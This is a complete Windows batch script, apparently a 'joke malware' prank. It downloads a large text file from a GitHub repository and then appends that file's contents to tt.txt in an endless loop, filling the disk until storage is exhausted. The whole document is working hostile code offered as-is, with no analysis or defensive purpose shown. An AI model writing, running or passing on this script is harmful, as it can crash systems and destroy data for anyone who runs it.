@echo off
title bob
color 1A

if not exist "%~dp0big_file.txt" (
  curl -L https://github.com/BOBZERO-afk/joke_malware/raw/refs/heads/main/big_file.txt -o big_file.txt
)
if not exist "%~dp0tt.txt" (
  echo AAAAAAAAAA>tt.txt
)
goto dump

:dump
>> tt.txt (
    for /f "delims=" %%A in (big_file.txt) do (
        echo %%A
    )
)
goto dump
